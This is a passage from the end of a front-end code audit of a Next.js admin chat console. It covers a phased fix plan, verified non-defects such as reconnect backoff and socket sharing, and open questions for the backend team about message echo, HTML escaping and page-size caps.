2. [F-4](#f-4-critical--scroll-state-re-renders-the-whole-transcript-on-every-frame) steps 3-4 — move `isUserAtBottom` out of the orchestrator; delete the duplicate `stripHtml`.
3. [F-24](#f-24-medium--inline-props-defeat-reactmemo-on-three-children) — hoist `commonEmojis`, `useCallback` the toggle.
4. [F-3](#f-3-critical--the-transcript-is-not-virtualised) — add `react-virtuoso`. Do this **last**, once per-row cost is low enough that the remaining cost is acceptable unvirtualised for a while.

### Phase 5 — Architecture & cleanup (~3 days)

Highest effort, lowest urgency — nothing here is an outage, but each item is a
future incident prevented:

- Promote the three ref-reads-in-memos to state ([F-9](#f-9-high--three-refs-are-read-inside-usememo-with-no-dependency)).
- Rework URL sync to push-and-keep ([F-8](#f-8-high--deep-links-are-read-then-erased-the-back-button-is-broken)), which collapses [F-23](#f-23-medium--deep-link-selection-implemented-eight-times) with it.
- Build the shared `<Overlay>` primitive, closing [F-22](#f-22-medium--escape-in-any-drawer-destroys-the-whole-console) and [F-31](#f-31-medium--six-overlays-inconsistent-escapefocusscroll-lock) together.
- Delete the [F-32](#f-32-low--dead-code-inventory) inventory — ~700 lines. Delete `ChatDrawer`/`ControlGrid` or wire it up; it can't run today.
- Accessibility pass ([F-30](#f-30-medium--accessibility-gaps-in-the-shell)).
- Split the 15 drawer-owned `useState` calls out of the orchestrator, then decompose
  it. [F-14](#f-14-high--composer-draft-and-pending-image-leak-across-conversations)'s per-conversation draft map is the natural first extraction.

---

## Things worth knowing that are **not** defects

Recorded so a future reviewer doesn't re-investigate them:

- **Reconnect backoff is correct.** `reconnect-backoff.ts:15-19` uses
  `Math.min(Math.max(attempt-1,0), len-1)`, which is genuinely 1-based, and
  `reconnect-manager.ts:446` increments before the call. First retry is 1s.
- **No O(n²) per-message scan in the WS dedup path** — two linear passes at
  `:1183`, `:1195`. Checked properly, not assumed.
- **The two chat sockets correctly collapse into one.**
  `useChatUsers` and `useOnlinePlayers` both open `/ws/chatlist/?user_id=N`, but
  `websocket-manager.ts:107-124` keys connections on a token-stripped stable key,
  so they share a socket with two listener sets. Intentional.
- **Missing `cache`/`revalidate` on the proxy routes is fine.** Next 15.5.7 defaults
  route-handler `fetch` to `no-store`, so this isn't causing staleness.
- **Modal state reset is handled correctly** for balance, spins, profile, and notes
  — each resets its form on open.
- **Safe areas are handled** throughout (`env(safe-area-inset-*)`, `h-dvh`). No
  `visualViewport` usage, so the composer won't track the iOS software keyboard
  precisely — flagged as a possible gap, not a confirmed defect.
- **Missing route timeouts aren't a route-caching problem** — see above.

---

## Open questions for the backend team

Three findings can't be fully sized without backend input:

1. **Does the WS gateway echo admin messages back to the sender?** Determines how
   bad [F-12](#f-12-high--temp-id-dedup-collapses-two-real-messages-into-one) and the
   no-optimistic-send issue actually are.
2. **Is `chatroom_id` globally unique on `message.id`?** Determines whether the
   fail-open room check is a live cross-room corruption bug or only latent.
3. **Does Django escape player text before it reaches `ChatMessage.text`?** Affects
   the severity of [F-1](#f-1-critical--player-text-is-rendered-as-raw-html) — though
   the client-side defect stands either way.
4. **Does Django cap `page_size`?** Affects [F-28](#f-28-medium--client-params-interpolated-into-the-upstream-url).

---

*No source files were modified during this audit.*
